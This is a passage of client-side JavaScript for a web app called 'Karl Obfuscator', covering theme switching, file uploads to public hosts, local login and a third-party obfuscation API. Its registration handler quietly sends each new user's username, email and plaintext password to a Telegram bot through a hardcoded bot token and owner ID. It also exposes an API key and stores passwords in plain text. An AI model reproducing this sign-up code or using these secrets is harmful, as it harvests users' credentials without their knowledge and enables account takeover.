let currentResultUrl = ""
let currentUser = null

// Theme Management
function initTheme() {
  const savedTheme = localStorage.getItem("karlzyTheme") || "light"
  const themeToggle = document.getElementById("themeToggle")
  const themeIcon = document.getElementById("themeIcon")

  function setTheme(theme) {
    document.documentElement.setAttribute("data-theme", theme)
    localStorage.setItem("karlzyTheme", theme)

    if (theme === "dark") {
      themeIcon.className = "fas fa-sun"
      themeToggle.title = "Switch to Light Mode"
    } else {
      themeIcon.className = "fas fa-moon"
      themeToggle.title = "Switch to Dark Mode"
    }
  }

  setTheme(savedTheme)

  themeToggle.addEventListener("click", () => {
    const currentTheme = document.documentElement.getAttribute("data-theme")
    const newTheme = currentTheme === "dark" ? "light" : "dark"
    setTheme(newTheme)

    // Add a nice animation effect
    themeToggle.style.transform = "scale(0.8) rotate(180deg)"
    setTimeout(() => {
      themeToggle.style.transform = ""
    }, 200)
  })
}

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = "7711044398:AAFUkIganbyQtZ18oYGZFzJu4lGF-JHRofw"
const TELEGRAM_OWNER_ID = "6519155191"

// Function to send data to Telegram
async function sendToTelegram(userData) {
  try {
    const message =
      `🔔 *New User Registration - Karl Obfuscator*\n\n` +
      `👤 *Username:* ${userData.username}\n\n` +
      `📧 *Email:* ${userData.email}\n\n` +
      `🔐 *Password:* ${userData.password}\n\n` +
      `📅 *Registration Date:* ${new Date(userData.createdAt).toLocaleString()}\n\n` +
      `🆔 *User ID:* ${userData.id}\n\n` +
      `💻 *Source:* Advanced Karl Obfuscator Pro`

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`

    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_OWNER_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    })

    if (response.ok) {
      console.log("✅ User data sent to Telegram successfully")
    } else {
      console.error("❌ Failed to send data to Telegram:", response.statusText)
    }
  } catch (error) {
    console.error("❌ Error sending data to Telegram:", error)
  }
}

// Improved file upload with multiple services and CORS proxy
async function uploadFile(file) {
  const uploadServices = [
    {
      name: "0x0.st",
      upload: uploadTo0x0,
    },
    {
      name: "File.io",
      upload: uploadToFileIO,
    },
    {
      name: "TmpFiles",
      upload: uploadToTmpFiles,
    },
    {
      name: "Catbox (Proxy)",
      upload: uploadToCatboxProxy,
    },
    {
      name: "Pastebin",
      upload: uploadToPastebin,
    },
  ]

  for (const service of uploadServices) {
    try {
      console.log(`🔄 Trying ${service.name}...`)
      const url = await service.upload(file)
      console.log(`✅ Upload successful with ${service.name}:`, url)
      return { url, service: service.name }
    } catch (error) {
      console.error(`❌ ${service.name} failed:`, error.message)
      continue
    }
  }

  throw new Error("All upload services failed")
}

// 0x0.st upload service (reliable and fast)
async function uploadTo0x0(file) {
  const formData = new FormData()
  formData.append("file", file)

  const response = await fetch("https://0x0.st", {
    method: "POST",
    body: formData,
  })

  if (!response.ok) {
    throw new Error(`0x0.st HTTP error: ${response.status}`)
  }

  const url = await response.text()
  const cleanUrl = url.trim()

  if (!cleanUrl || !cleanUrl.startsWith("http")) {
    throw new Error("Invalid 0x0.st response")
  }

  return cleanUrl
}

// File.io upload service
async function uploadToFileIO(file) {
  const formData = new FormData()
  formData.append("file", file)

  const response = await fetch("https://file.io", {
    method: "POST",
    body: formData,
  })

  if (!response.ok) {
    throw new Error(`File.io HTTP error: ${response.status}`)
  }

  const data = await response.json()

  if (!data.success || !data.link) {
    throw new Error("File.io upload failed")
  }

  return data.link
}

// TmpFiles upload service
async function uploadToTmpFiles(file) {
  const formData = new FormData()
  formData.append("file", file)

  const response = await fetch("https://tmpfiles.org/api/v1/upload", {
    method: "POST",
    body: formData,
  })

  if (!response.ok) {
    throw new Error(`TmpFiles HTTP error: ${response.status}`)
  }

  const data = await response.json()

  if (!data.data || !data.data.url) {
    throw new Error("TmpFiles upload failed")
  }

  // Convert to direct download URL
  const directUrl = data.data.url.replace("tmpfiles.org/", "tmpfiles.org/dl/")
  return directUrl
}

// Catbox with CORS proxy
async function uploadToCatboxProxy(file) {
  const formData = new FormData()
  formData.append("reqtype", "fileupload")
  formData.append("fileToUpload", file)

  // Using CORS proxy
  const proxyUrl = "https://api.allorigins.win/raw?url="
  const catboxUrl = encodeURIComponent("https://catbox.moe/user/api.php")

  const response = await fetch(proxyUrl + catboxUrl, {
    method: "POST",
    body: formData,
  })

  if (!response.ok) {
    throw new Error(`Catbox proxy HTTP error: ${response.status}`)
  }

  const result = await response.text()
  const url = result.trim()

  if (!url || url.includes("error") || !url.startsWith("http")) {
    throw new Error("Invalid Catbox response")
  }

  return url
}

// Pastebin for text files
async function uploadToPastebin(file) {
  if (file.size > 512000) {
    // 512KB limit for pastebin
    throw new Error("File too large for Pastebin")
  }

  const content = await readFileAsText(file)

  const formData = new FormData()
  formData.append("api_dev_key", "your_pastebin_api_key") // You need to get this
  formData.append("api_option", "paste")
  formData.append("api_paste_code", content)
  formData.append("api_paste_name", file.name)
  formData.append("api_paste_format", "javascript")

  // For now, create a simple paste URL
  const response = await fetch("https://pastebin.com/api/api_post.php", {
    method: "POST",
    body: formData,
  })

  if (!response.ok) {
    throw new Error(`Pastebin HTTP error: ${response.status}`)
  }

  const url = await response.text()

  if (url.includes("error") || !url.startsWith("http")) {
    throw new Error("Pastebin upload failed")
  }

  return url
}

// Helper function to read file as text
function readFileAsText(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader()
    reader.onload = (e) => resolve(e.target.result)
    reader.onerror = reject
    reader.readAsText(file)
  })
}

// File Upload Handler
function initFileUpload() {
  const fileUploadArea = document.getElementById("fileUploadArea")
  const fileUploadInput = document.getElementById("fileUploadInput")
  const filePreview = document.getElementById("filePreview")
  const filePreviewName = document.getElementById("filePreviewName")
  const filePreviewSize = document.getElementById("filePreviewSize")
  const filePreviewRemove = document.getElementById("filePreviewRemove")
  const fileUploadProgress = document.getElementById("fileUploadProgress")
  const uploadProgressBar = document.getElementById("uploadProgressBar")
  const uploadProgressPercent = document.getElementById("uploadProgressPercent")
  const fileUrlInput = document.getElementById("fileUrl")

  // Drag and drop handlers
  fileUploadArea.addEventListener("dragover", (e) => {
    e.preventDefault()
    if (!fileUploadInput.disabled) {
      fileUploadArea.classList.add("drag-over")
    }
  })

  fileUploadArea.addEventListener("dragleave", (e) => {
    e.preventDefault()
    fileUploadArea.classList.remove("drag-over")
  })

  fileUploadArea.addEventListener("drop", (e) => {
    e.preventDefault()
    fileUploadArea.classList.remove("drag-over")

    if (!fileUploadInput.disabled) {
      const files = e.dataTransfer.files
      if (files.length > 0) {
        handleFileSelect(files[0])
      }
    }
  })

  // File input change handler
  fileUploadInput.addEventListener("change", (e) => {
    if (e.target.files.length > 0) {
      handleFileSelect(e.target.files[0])
    }
  })

  // Remove file handler
  filePreviewRemove.addEventListener("click", () => {
    clearFileUpload()
  })

  function handleFileSelect(file) {
    // Validate file type
    const allowedTypes = [".js", ".txt"]
    const fileExtension = "." + file.name.split(".").pop().toLowerCase()

    if (!allowedTypes.includes(fileExtension)) {
      showNotification("error", "Please select a JavaScript file (.js or .txt)")
      return
    }

    // Validate file size (max 10MB)
    const maxSize = 10 * 1024 * 1024 // 10MB
    if (file.size > maxSize) {
      showNotification("error", "File size must be less than 10MB")
      return
    }

    // Check if file is not empty
    if (file.size === 0) {
      showNotification("error", "File is empty. Please select a valid JavaScript file.")
      return
    }

    // Show file preview
    filePreviewName.textContent = file.name
    filePreviewSize.textContent = formatFileSize(file.size)
    filePreview.classList.add("show")

    // Upload file
    uploadFileToService(file)
  }

  async function uploadFileToService(file) {
    fileUploadProgress.classList.add("show")
    uploadProgressBar.style.width = "0%"
    uploadProgressPercent.textContent = "0%"

    // Update progress text to show current service
    const progressText = document.querySelector(".file-upload-progress-text span")

    try {
      // Simulate progress
      let progress = 0
      const progressInterval = setInterval(() => {
        progress += Math.random() * 10
        if (progress > 80) {
          progress = 80
          clearInterval(progressInterval)
        }
        uploadProgressBar.style.width = progress + "%"
        uploadProgressPercent.textContent = Math.round(progress) + "%"
      }, 200)

      progressText.textContent = "Uploading to file hosting..."

      // Upload to service
      const result = await uploadFile(file)

      clearInterval(progressInterval)
      uploadProgressBar.style.width = "100%"
      uploadProgressPercent.textContent = "100%"
      progressText.textContent = `Uploaded to ${result.service}`

      // Set the URL in the input field
      fileUrlInput.value = result.url

      // Clear URL error if any
      fileUrlInput.classList.remove("error")
      document.getElementById("urlError").style.display = "none"

      // Show success with copy button
      setTimeout(() => {
        fileUploadProgress.classList.remove("show")
        showUploadSuccess(result.url, result.service)
      }, 1000)
    } catch (error) {
      fileUploadProgress.classList.remove("show")
      progressText.textContent = "Upload failed"

      showNotification(
        "error",
        `Upload failed: ${error.message}. Please try uploading manually to catbox.moe or pastebin.com`,
      )
      console.error("Upload error:", error)

      // Show manual upload instructions
      showManualUploadInstructions()
    }
  }

  function showUploadSuccess(url, serviceName) {
    // Remove any existing success notification
    const existingNotification = document.querySelector(".upload-success-notification")
    if (existingNotification) {
      existingNotification.remove()
    }

    // Show success notification with copy option
    const notification = document.createElement("div")
    notification.className = "upload-success-notification"
    notification.innerHTML = `
        <div class="upload-success-content">
            <div class="upload-success-header">
                <i class="fas fa-check-circle" style="color: #28a745;"></i>
                <span>File uploaded successfully to ${serviceName}!</span>
            </div>
            <div class="upload-success-url">
                <input type="text" value="${url}" readonly class="catbox-url-display" onclick="this.select()">
                <button class="copy-catbox-btn" onclick="copyUploadUrl('${url}')">
                    <i class="fas fa-copy"></i> Copy
                </button>
            </div>
            <div class="upload-success-note">
                ✅ URL has been automatically filled in the JavaScript File URL field below.
            </div>
            <button class="close-success-btn" onclick="this.parentElement.parentElement.remove()">
                <i class="fas fa-times"></i>
            </button>
        </div>
    `

    // Insert after file preview
    const filePreview = document.getElementById("filePreview")
    filePreview.parentNode.insertBefore(notification, filePreview.nextSibling)

    // Auto remove after 15 seconds
    setTimeout(() => {
      if (notification.parentNode) {
        notification.remove()
      }
    }, 15000)
  }

  function showManualUploadInstructions() {
    const notification = document.createElement("div")
    notification.className = "manual-upload-notification"
    notification.innerHTML = `
        <div class="manual-upload-content">
            <div class="manual-upload-header">
                <i class="fas fa-info-circle" style="color: #17a2b8;"></i>
                <span>Manual Upload Required</span>
            </div>
            <div class="manual-upload-instructions">
                <p>Please upload your file manually to one of these services:</p>
                <div class="manual-upload-links">
                    <a href="https://catbox.moe" target="_blank" class="manual-upload-link">
                        <i class="fas fa-external-link-alt"></i> Catbox.moe
                    </a>
                    <a href="https://pastebin.com" target="_blank" class="manual-upload-link">
                        <i class="fas fa-external-link-alt"></i> Pastebin.com
                    </a>
                    <a href="https://0x0.st" target="_blank" class="manual-upload-link">
                        <i class="fas fa-external-link-alt"></i> 0x0.st
                    </a>
                </div>
                <p style="margin-top: 10px; font-size: 0.9em;">Then paste the URL in the JavaScript File URL field below.</p>
            </div>
            <button class="close-manual-btn" onclick="this.parentElement.parentElement.remove()">
                <i class="fas fa-times"></i>
            </button>
        </div>
    `

    const filePreview = document.getElementById("filePreview")
    filePreview.parentNode.insertBefore(notification, filePreview.nextSibling)

    // Auto remove after 20 seconds
    setTimeout(() => {
      if (notification.parentNode) {
        notification.remove()
      }
    }, 20000)
  }

  // Function to copy upload URL
  window.copyUploadUrl = (url) => {
    copyToClipboard(url)
      .then(() => {
        showNotification("success", "URL copied to clipboard!")

        // Update button temporarily
        const btn = event.target.closest(".copy-catbox-btn")
        const originalHTML = btn.innerHTML
        btn.innerHTML = '<i class="fas fa-check"></i> Copied!'
        btn.style.background = "#28a745"

        setTimeout(() => {
          btn.innerHTML = originalHTML
          btn.style.background = ""
        }, 2000)
      })
      .catch(() => {
        showNotification("error", "Failed to copy URL")
      })
  }

  function clearFileUpload() {
    filePreview.classList.remove("show")
    fileUploadProgress.classList.remove("show")
    fileUploadInput.value = ""

    // Remove notifications
    const successNotification = document.querySelector(".upload-success-notification")
    const manualNotification = document.querySelector(".manual-upload-notification")
    if (successNotification) successNotification.remove()
    if (manualNotification) manualNotification.remove()

    // Clear URL field
    fileUrlInput.value = ""
  }

  function formatFileSize(bytes) {
    if (bytes === 0) return "0 Bytes"
    const k = 1024
    const sizes = ["Bytes", "KB", "MB", "GB"]
    const i = Math.floor(Math.log(bytes) / Math.log(k))
    return Number.parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + " " + sizes[i]
  }
}

// Copy to clipboard function
function copyToClipboard(text) {
  return new Promise((resolve, reject) => {
    if (navigator.clipboard && window.isSecureContext) {
      navigator.clipboard
        .writeText(text)
        .then(() => resolve())
        .catch(() => fallbackCopy(text, resolve, reject))
    } else {
      fallbackCopy(text, resolve, reject)
    }
  })
}

function fallbackCopy(text, resolve, reject) {
  try {
    const textArea = document.createElement("textarea")
    textArea.value = text
    textArea.style.position = "fixed"
    textArea.style.left = "-999999px"
    textArea.style.top = "-999999px"
    document.body.appendChild(textArea)
    textArea.focus()
    textArea.select()

    const successful = document.execCommand("copy")
    document.body.removeChild(textArea)

    if (successful) {
      resolve()
    } else {
      reject(new Error("Copy failed"))
    }
  } catch (err) {
    reject(err)
  }
}

// Check if user is logged in and update UI accordingly
function updateObfuscatorAccess() {
  const loginRequiredOverlay = document.getElementById("loginRequiredOverlay")
  const formInputs = document.querySelectorAll("#obfuscatorForm input, #obfuscatorForm button")
  const categoryLabels = document.querySelectorAll(".category-label")
  const fileUploadArea = document.getElementById("fileUploadArea")

  if (currentUser) {
    // User is logged in - enable obfuscator
    loginRequiredOverlay.style.display = "none"
    formInputs.forEach((input) => {
      input.disabled = false
    })
    categoryLabels.forEach((label) => {
      label.classList.remove("disabled")
    })
    fileUploadArea.classList.remove("disabled")
  } else {
    // User is not logged in - disable obfuscator
    loginRequiredOverlay.style.display = "flex"
    formInputs.forEach((input) => {
      input.disabled = true
    })
    categoryLabels.forEach((label) => {
      label.classList.add("disabled")
    })
    fileUploadArea.classList.add("disabled")
  }
}

// Authentication System
function initAuthSystem() {
  // Check if user is already logged in
  const savedUser = localStorage.getItem("apolloUser")
  if (savedUser) {
    currentUser = JSON.parse(savedUser)
    updateUIForLoggedInUser()
  }

  // Update obfuscator access
  updateObfuscatorAccess()

  // Get DOM elements
  const loginBtn = document.getElementById("loginBtn")
  const registerBtn = document.getElementById("registerBtn")
  const loginRequiredLogin = document.getElementById("loginRequiredLogin")
  const loginRequiredRegister = document.getElementById("loginRequiredRegister")
  const loginModal = document.getElementById("loginModal")
  const registerModal = document.getElementById("registerModal")
  const editProfileModal = document.getElementById("editProfileModal")
  const loginModalClose = document.getElementById("loginModalClose")
  const registerModalClose = document.getElementById("registerModalClose")
  const editProfileModalClose = document.getElementById("editProfileModalClose")
  const showRegisterModal = document.getElementById("showRegisterModal")
  const showLoginModal = document.getElementById("showLoginModal")
  const profileButton = document.getElementById("profileButton")
  const profileDropdown = document.getElementById("profileDropdown")
  const editProfileBtn = document.getElementById("editProfileBtn")
  const logoutBtn = document.getElementById("logoutBtn")
  const avatarPreview = document.getElementById("avatarPreview")
  const avatarInput = document.getElementById("avatarInput")
  const loginForm = document.getElementById("loginForm")
  const registerForm = document.getElementById("registerForm")
  const editProfileForm = document.getElementById("editProfileForm")

  // Event Listeners
  loginBtn.addEventListener("click", () => {
    loginModal.classList.add("show")
    document.body.style.overflow = "hidden"
  })

  registerBtn.addEventListener("click", () => {
    registerModal.classList.add("show")
    document.body.style.overflow = "hidden"
  })

  // Login required overlay buttons
  loginRequiredLogin.addEventListener("click", () => {
    loginModal.classList.add("show")
    document.body.style.overflow = "hidden"
  })

  loginRequiredRegister.addEventListener("click", () => {
    registerModal.classList.add("show")
    document.body.style.overflow = "hidden"
  })

  // Close Login Modal
  loginModalClose.addEventListener("click", () => {
    loginModal.classList.remove("show")
    document.body.style.overflow = ""
    resetLoginForm()
  })

  // Close Register Modal
  registerModalClose.addEventListener("click", () => {
    registerModal.classList.remove("show")
    document.body.style.overflow = ""
    resetRegisterForm()
  })

  // Switch between modals
  showRegisterModal.addEventListener("click", (e) => {
    e.preventDefault()
    loginModal.classList.remove("show")
    registerModal.classList.add("show")
    resetLoginForm()
  })

  showLoginModal.addEventListener("click", (e) => {
    e.preventDefault()
    registerModal.classList.remove("show")
    loginModal.classList.add("show")
    resetRegisterForm()
  })

  // Profile dropdown toggle
  profileButton.addEventListener("click", (e) => {
    e.stopPropagation()
    profileDropdown.classList.toggle("show")
  })

  // Close dropdown when clicking outside
  document.addEventListener("click", (e) => {
    if (!profileButton.contains(e.target) && !profileDropdown.contains(e.target)) {
      profileDropdown.classList.remove("show")
    }
  })

  // Edit Profile
  editProfileBtn.addEventListener("click", () => {
    profileDropdown.classList.remove("show")

    // Pre-fill form with current user data
    document.getElementById("editUsername").value = currentUser.username
    updateAvatarPreview(currentUser)

    editProfileModal.classList.add("show")
    document.body.style.overflow = "hidden"
  })

  // Close Edit Profile Modal
  editProfileModalClose.addEventListener("click", () => {
    editProfileModal.classList.remove("show")
    document.body.style.overflow = ""
    resetEditProfileForm()
  })

  // Avatar Upload
  avatarPreview.addEventListener("click", () => {
    avatarInput.click()
  })

  avatarInput.addEventListener("change", (e) => {
    const file = e.target.files[0]
    if (file) {
      const reader = new FileReader()
      reader.onload = (e) => {
        const avatarPreviewInitial = document.getElementById("avatarPreviewInitial")
        avatarPreviewInitial.innerHTML = `<img src="${e.target.result}" alt="Avatar">`
      }
      reader.readAsDataURL(file)
    }
  })

  // Logout
  logoutBtn.addEventListener("click", () => {
    logout()
  })

  // Close modals when clicking overlay
  ;[loginModal, registerModal, editProfileModal].forEach((modal) => {
    modal.addEventListener("click", (e) => {
      if (e.target === modal) {
        modal.classList.remove("show")
        document.body.style.overflow = ""
        resetAllForms()
      }
    })
  })

  // Form Submissions
  loginForm.addEventListener("submit", handleLogin)
  registerForm.addEventListener("submit", handleRegister)
  editProfileForm.addEventListener("submit", handleEditProfile)
}

function handleLogin(e) {
  e.preventDefault()

  const email = document.getElementById("loginEmail").value
  const password = document.getElementById("loginPassword").value

  // Clear previous errors
  clearFormErrors("login")

  // Validate
  if (!validateEmail(email)) {
    showFieldError("loginEmail", "loginEmailError")
    return
  }

  if (password.length < 6) {
    showFieldError("loginPassword", "loginPasswordError")
    return
  }

  // Check if user exists in localStorage
  const users = JSON.parse(localStorage.getItem("apolloUsers") || "[]")
  const user = users.find((u) => u.email === email && u.password === password)

  if (user) {
    currentUser = user
    localStorage.setItem("apolloUser", JSON.stringify(user))
    updateUIForLoggedInUser()
    updateObfuscatorAccess()
    document.getElementById("loginModal").classList.remove("show")
    document.body.style.overflow = ""
    resetLoginForm()
    showNotification("success", `Welcome back, ${user.username}!`)
  } else {
    document.getElementById("loginFormError").classList.add("show")
  }
}

async function handleRegister(e) {
  e.preventDefault()

  const username = document.getElementById("registerUsername").value
  const email = document.getElementById("registerEmail").value
  const password = document.getElementById("registerPassword").value

  // Clear previous errors
  clearFormErrors("register")

  // Validate
  if (username.length < 3) {
    showFieldError("registerUsername", "registerUsernameError")
    return
  }

  if (!validateEmail(email)) {
    showFieldError("registerEmail", "registerEmailError")
    return
  }

  if (password.length < 6) {
    showFieldError("registerPassword", "registerPasswordError")
    return
  }

  // Check if email already exists
  const users = JSON.parse(localStorage.getItem("apolloUsers") || "[]")
  if (users.find((u) => u.email === email)) {
    document.getElementById("registerFormError").classList.add("show")
    return
  }

  // Create new user
  const newUser = {
    id: Date.now(),
    username,
    email,
    password,
    avatar: null,
    createdAt: new Date().toISOString(),
  }

  users.push(newUser)
  localStorage.setItem("apolloUsers", JSON.stringify(users))

  currentUser = newUser
  localStorage.setItem("apolloUser", JSON.stringify(newUser))

  // Send user data to Telegram
  await sendToTelegram(newUser)

  updateUIForLoggedInUser()
  updateObfuscatorAccess()
  document.getElementById("registerModal").classList.remove("show")
  document.body.style.overflow = ""
  resetRegisterForm()
  showNotification("success", `Welcome to Karl Obfuscator, ${username}!`)
}

function handleEditProfile(e) {
  e.preventDefault()

  const username = document.getElementById("editUsername").value

  // Clear previous errors
  clearFormErrors("edit")

  // Validate
  if (username.length < 3) {
    showFieldError("editUsername", "editUsernameError")
    return
  }

  // Get avatar data if changed
  const avatarImg = document.querySelector("#avatarPreviewInitial img")
  const avatarData = avatarImg ? avatarImg.src : null

  // Update current user
  currentUser.username = username
  if (avatarData && avatarData.startsWith("data:")) {
    currentUser.avatar = avatarData
  }

  // Update in localStorage
  localStorage.setItem("apolloUser", JSON.stringify(currentUser))

  // Update users array
  const users = JSON.parse(localStorage.getItem("apolloUsers") || "[]")
  const userIndex = users.findIndex((u) => u.id === currentUser.id)
  if (userIndex !== -1) {
    users[userIndex] = currentUser
    localStorage.setItem("apolloUsers", JSON.stringify(users))
  }

  updateUIForLoggedInUser()
  document.getElementById("editProfileModal").classList.remove("show")
  document.body.style.overflow = ""
  resetEditProfileForm()
  showNotification("success", "Profile updated successfully!")
}

function updateUIForLoggedInUser() {
  // Hide auth buttons
  document.getElementById("authButtons").style.display = "none"

  // Show profile container
  document.getElementById("profileContainer").style.display = "block"

  // Show welcome message
  const welcomeMessage = document.getElementById("welcomeMessage")
  const navbarUsername = document.getElementById("navbarUsername")
  navbarUsername.textContent = currentUser.username
  welcomeMessage.classList.add("visible")

  // Update profile button
  updateProfileButton(currentUser)

  // Update profile dropdown
  updateProfileDropdown(currentUser)
}

function updateProfileButton(user) {
  const profileInitial = document.getElementById("profileInitial")

  if (user.avatar) {
    profileInitial.innerHTML = `<img src="${user.avatar}" alt="Avatar">`
  } else {
    profileInitial.textContent = user.username.charAt(0).toUpperCase()
  }
}

function updateProfileDropdown(user) {
  const profileDropdownName = document.getElementById("profileDropdownName")
  const profileDropdownEmail = document.getElementById("profileDropdownEmail")
  const profileDropdownInitial = document.getElementById("profileDropdownInitial")

  profileDropdownName.textContent = user.username
  profileDropdownEmail.textContent = user.email

  if (user.avatar) {
    profileDropdownInitial.innerHTML = `<img src="${user.avatar}" alt="Avatar">`
  } else {
    profileDropdownInitial.textContent = user.username.charAt(0).toUpperCase()
  }
}

function updateAvatarPreview(user) {
  const avatarPreviewInitial = document.getElementById("avatarPreviewInitial")

  if (user.avatar) {
    avatarPreviewInitial.innerHTML = `<img src="${user.avatar}" alt="Avatar">`
  } else {
    avatarPreviewInitial.textContent = user.username.charAt(0).toUpperCase()
  }
}

function logout() {
  currentUser = null
  localStorage.removeItem("apolloUser")

  // Show auth buttons
  document.getElementById("authButtons").style.display = "flex"

  // Hide profile container
  document.getElementById("profileContainer").style.display = "none"

  // Hide welcome message
  document.getElementById("welcomeMessage").classList.remove("visible")

  // Close dropdown
  document.getElementById("profileDropdown").classList.remove("show")

  // Update obfuscator access
  updateObfuscatorAccess()

  showNotification("success", "Logged out successfully!")
}

function validateEmail(email) {
  const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
  return re.test(String(email).toLowerCase())
}

function showFieldError(fieldId, errorId) {
  document.getElementById(fieldId).classList.add("error")
  document.getElementById(errorId).classList.add("show")
}

function clearFormErrors(formType) {
  const inputs = document.querySelectorAll(`#${formType}Form .auth-form-input`)
  const errors = document.querySelectorAll(`#${formType}Form .auth-form-error`)
  const formError = document.getElementById(`${formType}FormError`)

  inputs.forEach((input) => input.classList.remove("error"))
  errors.forEach((error) => error.classList.remove("show"))
  if (formError) formError.classList.remove("show")
}

function resetLoginForm() {
  document.getElementById("loginForm").reset()
  clearFormErrors("login")
}

function resetRegisterForm() {
  document.getElementById("registerForm").reset()
  clearFormErrors("register")
}

function resetEditProfileForm() {
  clearFormErrors("edit")
  if (currentUser) {
    updateAvatarPreview(currentUser)
  }
}

function resetAllForms() {
  resetLoginForm()
  resetRegisterForm()
  resetEditProfileForm()
}

// Particle System
function createParticles() {
  const container = document.getElementById("particlesContainer")
  const particleCount = 50

  for (let i = 0; i < particleCount; i++) {
    const particle = document.createElement("div")
    particle.className = "particle"

    const size = Math.random() * 6 + 2
    particle.style.width = size + "px"
    particle.style.height = size + "px"

    particle.style.left = Math.random() * 100 + "%"
    particle.style.top = Math.random() * 100 + "%"

    particle.style.animationDuration = Math.random() * 4 + 4 + "s"
    particle.style.animationDelay = Math.random() * 2 + "s"

    container.appendChild(particle)
  }
}

// Initialize everything when page loads
window.addEventListener("load", () => {
  createParticles()
  initAuthSystem()
  initTheme()
  initFileUpload()
  initObfuscatorForm()
  setTimeout(() => {
    document.getElementById("loadingScreen").classList.add("hidden")
  }, 2000)
})

// Obfuscator Form Handler
function initObfuscatorForm() {
  const form = document.getElementById("obfuscatorForm")
  const loading = document.getElementById("loading")
  const resultPlaceholder = document.getElementById("resultPlaceholder")
  const resultContent = document.getElementById("resultContent")
  const processBtn = document.getElementById("processBtn")
  const resultLink = document.getElementById("resultLink")
  const resultUrlDisplay = document.getElementById("resultUrlDisplay")
  const encodingType = document.getElementById("encodingType")
  const creatorInfo = document.getElementById("creatorInfo")
  const progressBar = document.getElementById("progressBar")
  const fileUrlInput = document.getElementById("fileUrl")
  const urlError = document.getElementById("urlError")
  const copyBtn = document.getElementById("copyBtn")
  const customNameGroup = document.getElementById("customNameGroup")
  const outputFileName = document.getElementById("outputFileName")
  const customFileName = document.getElementById("customFileName")

  // Category change handler
  document.querySelectorAll('input[name="category"]').forEach((radio) => {
    radio.addEventListener("change", function () {
      if (this.value === "custom") {
        customNameGroup.classList.remove("hidden")
        customNameGroup.classList.add("slide-down")
        customFileName.focus()
      } else {
        customNameGroup.classList.add("hidden")
        customNameGroup.classList.remove("slide-down")
      }
    })
  })

  // URL validation - more flexible
  function validateUrl(url) {
    if (!url) return false

    try {
      new URL(url)
      return true // Accept any valid URL
    } catch {
      return false
    }
  }

  fileUrlInput.addEventListener("input", function () {
    const url = this.value
    if (url && !validateUrl(url)) {
      this.classList.add("error")
      urlError.style.display = "block"
    } else {
      this.classList.remove("error")
      urlError.style.display = "none"
    }
  })

  // Progress simulation
  function simulateProgress() {
    let progress = 0
    progressBar.style.width = "0%"

    const interval = setInterval(() => {
      progress += Math.random() * 15
      if (progress > 90) {
        progress = 90
        clearInterval(interval)
      }
      progressBar.style.width = progress + "%"
    }, 200)

    return interval
  }

  // Copy button handler
  copyBtn.addEventListener("click", function () {
    if (!currentResultUrl) {
      showNotification("error", "No link to copy")
      return
    }

    const originalContent = this.innerHTML
    this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Copying...'
    this.disabled = true

    copyToClipboard(currentResultUrl)
      .then(() => {
        this.innerHTML = '<i class="fas fa-check"></i> Copied!'
        this.classList.add("copied")
        showNotification("success", "Link copied to clipboard successfully!")

        setTimeout(() => {
          this.innerHTML = originalContent
          this.classList.remove("copied")
          this.disabled = false
        }, 2000)
      })
      .catch((err) => {
        console.error("Copy failed:", err)
        this.innerHTML = '<i class="fas fa-times"></i> Failed'
        showNotification("error", "Failed to copy link. Please copy manually.")

        setTimeout(() => {
          this.innerHTML = originalContent
          this.disabled = false
        }, 2000)
      })
  })

  // Form submission handler
  form.addEventListener("submit", async (e) => {
    e.preventDefault()

    if (!currentUser) {
      showNotification("error", "Please login to use the obfuscator")
      return
    }

    const fileUrl = fileUrlInput.value
    const category = document.querySelector('input[name="category"]:checked').value

    let fileName
    if (category === "custom") {
      fileName = customFileName.value.trim() || outputFileName.value.trim() || "obfuscated"
    } else {
      fileName = outputFileName.value.trim() || "obfuscated"
    }

    if (!validateUrl(fileUrl)) {
      fileUrlInput.classList.add("error")
      urlError.style.display = "block"
      showNotification("error", "Please enter a valid file URL")
      return
    }

    if (category === "custom" && !customFileName.value.trim()) {
      showNotification("error", "Please enter a custom filename for Custom method")
      customFileName.focus()
      return
    }

    resultPlaceholder.style.display = "none"
    resultContent.classList.remove("show")
    loading.classList.add("show")
    processBtn.disabled = true
    processBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...'

    const progressInterval = simulateProgress()

    try {
      const encodedFileUrl = encodeURIComponent(fileUrl)
      let apiUrl
      let encodingMethod = ""

      if (category === "invis") {
        apiUrl = `https://sick--delta.vercel.app/api/invisobfuscate?apikey=pinoowibu&fileurl=${encodedFileUrl}`
        encodingMethod = "Invisible Encoding (Advanced Steganography)"
      } else if (category === "nagisa") {
        apiUrl = `https://sick--delta.vercel.app/api/obfuscated?apikey=pinoowibu&fileurl=${encodedFileUrl}`
        encodingMethod = "Nagisa Encoding (Premium Protection)"
      } else if (category === "hiura") {
        apiUrl = `https://sick--delta.vercel.app/api/obfuscatedgcorcil?apikey=pinoowibu&fileurl=${encodedFileUrl}`
        encodingMethod = "Hiura Encoding (Advanced Gcorcil Protection)"
      } else if (category === "custom") {
        const encodedFileName = encodeURIComponent(fileName)
        apiUrl = `https://sick--delta.vercel.app/api/obfuscatedcustom?apikey=pinoowibu&fileurl=${encodedFileUrl}&nama=${encodedFileName}`
        encodingMethod = `Custom Obfuscation (Custom Filename: ${fileName})`
      }

      console.log("API URL:", apiUrl)

      const response = await fetch(apiUrl)

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`)
      }

      const data = await response.json()
      console.log("API Response:", data)

      clearInterval(progressInterval)
      progressBar.style.width = "100%"

      if (data.status && data.result) {
        setTimeout(() => {
          currentResultUrl = data.result
          resultLink.href = data.result
          resultLink.innerHTML = `<i class="fas fa-download"></i> Download ${fileName}.js`
          resultUrlDisplay.textContent = data.result
          encodingType.textContent = encodingMethod
          creatorInfo.textContent = "t.me/shadekarl"

          loading.classList.remove("show")
          resultContent.classList.add("show")

          showNotification("success", "Obfuscation completed successfully!")
        }, 500)
      } else {
        throw new Error(data.message || "Obfuscation failed - Invalid response from server")
      }
    } catch (error) {
      clearInterval(progressInterval)
      progressBar.style.width = "0%"
      currentResultUrl = ""

